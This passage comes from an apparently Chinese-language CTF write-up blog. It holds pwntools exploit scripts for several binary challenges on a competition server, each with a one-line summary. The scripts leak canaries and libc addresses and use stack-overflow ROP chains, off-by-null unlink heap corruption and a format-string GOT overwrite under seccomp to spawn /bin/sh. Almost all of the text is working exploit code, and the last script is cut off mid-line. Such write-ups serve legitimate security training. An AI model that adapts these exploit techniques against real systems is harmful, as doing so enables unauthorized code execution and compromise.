class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./pwn10'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'111.33.164.6'</span>, <span class="number">50010</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(content)</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'size :'</span>)</span><br><span class="line">    sl(str(len(content)))</span><br><span class="line">    ru(<span class="string">'content'</span>)</span><br><span class="line">    se(content)</span><br><span class="line">    ru(<span class="string">'choice :'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'index : \n'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'index :'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'size :'</span>)</span><br><span class="line">    sl(str(len(content)))</span><br><span class="line">    ru(<span class="string">'content'</span>)</span><br><span class="line">    se(content)</span><br><span class="line">    ru(<span class="string">'choice :'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'index :'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'choice :'</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">'c'</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">'/bin/sh\0'</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">sl(<span class="string">'3'</span>)</span><br><span class="line">ru(<span class="string">'Give me your size : '</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">ru(<span class="string">'content'</span>)</span><br><span class="line">se(<span class="string">'\x60'</span>)</span><br><span class="line">ru(<span class="string">'choice :'</span>)</span><br><span class="line"></span><br><span class="line">add(p64(<span class="number">0x602018</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x400F52</span>)[:<span class="number">7</span>])</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">'3'</span>)</span><br><span class="line">ru(<span class="string">'Give me your size : '</span>)</span><br><span class="line">sl(<span class="string">'8'</span>)</span><br><span class="line">ru(<span class="string">'content'</span>)</span><br><span class="line">se(p64(<span class="number">0x400F52</span>))</span><br><span class="line">ru(<span class="string">'choice :'</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x602020</span>))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">data = ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">ru(<span class="string">'choice :'</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">'3'</span>)</span><br><span class="line">ru(<span class="string">'Give me your size : '</span>)</span><br><span class="line">sl(<span class="string">'8'</span>)</span><br><span class="line">ru(<span class="string">'content'</span>)</span><br><span class="line">se(p64(<span class="number">0x602022</span>))</span><br><span class="line">ru(<span class="string">'choice :'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">data = data+(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>])</span><br><span class="line">ru(<span class="string">'choice :'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x602024</span>))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">data = data+(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>])</span><br><span class="line">ru(<span class="string">'choice :'</span>)</span><br><span class="line"></span><br><span class="line">puts = u64(data+<span class="string">'\0\0'</span>)</span><br><span class="line">base = puts - <span class="number">0x6b990</span></span><br><span class="line">free_hook = base+<span class="number">0x3a77c8</span></span><br><span class="line">system = base +<span class="number">0x41490</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">'3'</span>)</span><br><span class="line">ru(<span class="string">'Give me your size : '</span>)</span><br><span class="line">sl(<span class="string">'8'</span>)</span><br><span class="line">ru(<span class="string">'content'</span>)</span><br><span class="line">se(p64(<span class="number">0x602018</span>))</span><br><span class="line">ru(<span class="string">'choice :'</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">'4'</span>)</span><br><span class="line">ru(<span class="string">'index'</span>)</span><br><span class="line">sl(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">print(hex(puts))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="坐忘"><a href="#坐忘" class="headerlink" title="坐忘"></a>坐忘</h3><p>简单leak canary，然后base64解码一下，直接栈溢出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./pwn9'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'111.33.164.6'</span>, <span class="number">50009</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">'&gt;'</span>)</span><br><span class="line">sl(base64.b64encode(<span class="string">'a'</span>*<span class="number">9</span>))</span><br><span class="line">ru(<span class="string">'a'</span>*<span class="number">9</span>)</span><br><span class="line">canary = u64(<span class="string">'\0'</span>+ru(<span class="string">'\n'</span>)[:<span class="number">7</span>])</span><br><span class="line">ru(<span class="string">'continue ?'</span>)</span><br><span class="line">sl(<span class="string">'yes'</span>)</span><br><span class="line"></span><br><span class="line">r=ROP(<span class="string">'./pwn9'</span>)</span><br><span class="line">prdi = r.rdi[<span class="number">0</span>]</span><br><span class="line">prsi = r.rsi[<span class="number">0</span>]</span><br><span class="line">prdx = r.rdx[<span class="number">0</span>]</span><br><span class="line">bss = <span class="number">0x6CCBA0</span></span><br><span class="line">read = <span class="number">0x43FF70</span></span><br><span class="line">syscall = <span class="number">0x43FF9F</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">payload = <span class="string">'\0'</span>*<span class="number">8</span>+p64(canary)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">8</span></span><br><span class="line">payload += flat(prdi,<span class="number">0</span>,prsi,bss,prdx,<span class="number">0x3b</span>,read,prdi,bss,prsi,<span class="number">0</span>,prdx,<span class="number">0</span>,syscall)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'&gt;'</span>)</span><br><span class="line">sl(base64.b64encode(payload))</span><br><span class="line">ru(<span class="string">'continue ?'</span>)</span><br><span class="line">sl(<span class="string">'no'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">se(<span class="string">'/bin/sh\0'</span>.ljust(<span class="number">0x3b</span>,<span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="玄冥"><a href="#玄冥" class="headerlink" title="玄冥"></a>玄冥</h3><p>off by null -&gt; unlink -&gt; write anywhere </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./pwn'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'111.33.164.6'</span>, <span class="number">50007</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(sz)</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'size:'</span>)</span><br><span class="line">    sl(str(sz))</span><br><span class="line">    ru(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'id:'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'data:'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,sz,content)</span>:</span></span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'id:'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'size:'</span>)</span><br><span class="line">    sl(str(sz))</span><br><span class="line">    ru(<span class="string">'content:'</span>)</span><br><span class="line">    se(content)</span><br><span class="line">    ru(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'id:'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc = u64(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]+<span class="string">'\0\0'</span>)</span><br><span class="line">base = libc<span class="number">-0x3a5678</span></span><br><span class="line">free_hook = base+<span class="number">0x3a77c8</span></span><br><span class="line">system = base+<span class="number">0x41490</span></span><br><span class="line">binsh = base+<span class="number">0x1633e8</span></span><br><span class="line">ru(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x100</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(<span class="number">0x6020E0</span><span class="number">-0x18</span>)+p64(<span class="number">0x6020E0</span><span class="number">-0x10</span>)).ljust(<span class="number">0xf0</span>,<span class="string">'\x00'</span>)+p64(<span class="number">0xf0</span>)+p64(<span class="number">0x100</span>)[:<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x31</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x6020E0</span>)+p64(free_hook)+p64(binsh))</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">9</span>,p64(system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(<span class="string">'4'</span>)</span><br><span class="line">ru(<span class="string">'id:'</span>)</span><br><span class="line">sl(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">print(hex(libc))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="於讴"><a href="#於讴" class="headerlink" title="於讴"></a>於讴</h3><p>简单栈溢出，和拈花一样</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./pwn'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'111.33.164.6'</span>, <span class="number">50006</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line">r=ROP(<span class="string">'./pwn'</span>)</span><br><span class="line">e=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">prdi = r.rdi[<span class="number">0</span>]</span><br><span class="line">prsi = r.rsi[<span class="number">0</span>]</span><br><span class="line">puts = e.plt[<span class="string">'puts'</span>]</span><br><span class="line">bss = <span class="number">0x620000</span>+<span class="number">0x800</span></span><br><span class="line">prbp = r.rbp[<span class="number">0</span>]</span><br><span class="line">leave = r.leave[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">'1000'</span>)</span><br><span class="line">ru(<span class="string">'OH, WHY ARE YOU SO GOOD?\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">24</span> +p64(prdi)+p64(<span class="number">0x620030</span>)+p64(puts)</span><br><span class="line">payload += flat(<span class="number">0x414FBA</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0x620030</span>,<span class="number">0x200</span>,bss,<span class="number">0</span>,<span class="number">0x414FA0</span>,<span class="string">'a'</span>*<span class="number">56</span>)</span><br><span class="line">payload += flat(prbp,bss<span class="number">-8</span>,leave)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">se(payload+<span class="string">'\n'</span>)</span><br><span class="line">p_addr = u64(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]+<span class="string">'\0\0'</span>)</span><br><span class="line">syscall = p_addr+<span class="number">0xe</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat(<span class="number">0x414FBA</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0x620030</span>,<span class="number">0x3b</span>,bss+<span class="number">0x400</span>,<span class="number">0</span>,<span class="number">0x414FA0</span>,<span class="string">'a'</span>*<span class="number">56</span>)</span><br><span class="line">payload += flat(<span class="number">0x414FBA</span>,<span class="number">0</span>,<span class="number">1</span>,bss+<span class="number">0x100</span>,<span class="number">0</span>,<span class="number">0</span>,bss+<span class="number">0x108</span>,<span class="number">0x414FA0</span>,p64(syscall))</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'a'</span>)</span><br><span class="line">payload += p64(<span class="number">0x0414FD8</span>)+<span class="string">'/bin/sh\0'</span></span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">se(payload)</span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line">se(cyclic(<span class="number">0x3b</span>))</span><br><span class="line"></span><br><span class="line">print(hex(p_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="聂许"><a href="#聂许" class="headerlink" title="聂许"></a>聂许</h3><p>抄的是上一年xnuca的secretcenter</p>
+<p>这里可以设置任意的seccomp规则，然后有一个格式化字符串漏洞，但是是使用fprintf_chk，可以设置seccomp规则来绕过%n的check，然后利用格式化字符串直接写got表，在open那里写一个one_gadget，直接get shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./pwn'</span>)</span><br><span class="line">    <span class="comment">#p=process(['seccomp-tools','dump','./pwn'])</span></span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'111.33.164.6'</span>, <span class="number">50004</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x,timeout=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(content,n=False)</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'input the size'</span>)</span><br><span class="line">    sl(<span class="string">'240'</span>)</span><br><span class="line">    ru(<span class="string">'input your content: '</span>)</span><br><span class="line">    se(content)</span><br><span class="line">    <span class="keyword">if</span> n:</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        se(<span class="string">'000000000000-ffffffffffff r-xp 00000000 00:00 0 /bin/Ch4r1l3\n'</span>)        </span><br><span class="line">    <span class="keyword">return</span> ru(<span class="string">'Your choice :'</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Your choice :'</span>)</span><br><span class="line">sl(<span class="string">'3'</span>)</span><br><span class="line">ru(<span class="string">'Your choice :'</span>)</span><br><span class="line">sl(<span class="string">'666'</span>)</span><br><span class="line">ru(<span class="string">'input yout choice: '</span>)</span><br><span class="line">sl(<span class="string">'1'</span>) </span><br><span class="line">ru(<span class="string">'input the size'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    rule = <span class="string">' \x00\x00\x00\x04\x00\x00\x00\x15\x00\x00\b&gt;\x00\x00\xC0 \x00\x00\x00\x00\x00\x00\x00\x15\x00\x06\x00\x03\x00\x00\x00\x15\x00\x05\x00\xE7\x00\x00\x00\x15\x00\x00\x03\x02\x00\x00\x00 \x00\x00\x00\x10\x00\x00\x00T\x00\x00\x00\xFF\x00\x00\x00\x15\x00\x01\x00|\x00\x00\x00\x06\x00\x00\x00\x00\x00\xFF\x7F\x06\x00\x00\x00\x00\x00\x05\x00'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    rule = <span class="string">' \x00\x00\x00\x04\x00\x00\x00\x15\x00\x00\b&gt;\x00\x00\xC0 \x00\x00\x00\x00\x00\x00\x00\x15\x00\x06\x00\x03\x00\x00\x00\x15\x00\x05\x00\xE7\x00\x00\x00\x15\x00\x00\x03\x02\x00\x00\x00 \x00\x00\x00\x10\x00\x00\x00T\x00\x00\x00\xFF\x00\x00\x00\x15\x00\x01\x00[\x00\x00\x00\x06\x00\x00\x00\x00\x00\xFF\x7F\x06\x00\x00\x00\x00\x00\x05\x00'</span></span><br><span class="line"></span><br><span class="line">sl(str(len(rule)))</span><br><span class="line">ru(<span class="string">'input your content'</span>)</span><br><span class="line">se(rule)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Your choice :'</span>)</span><br><span class="line">sl(<span class="string">'4'</span>)</span><br><span class="line">ru(<span class="string">'Your choice :'</span>)</span><br><span class="line"></span><br><span class="line">add((<span class="string">'%41c'</span>+<span class="string">'%c'</span>*<span class="number">7</span>+<span class="string">'%n%n'</span>).ljust(<span class="number">0x18</span>,<span class="string">'a'</span>)+p64(<span class="number">0x6020F0</span>)+p64(<span 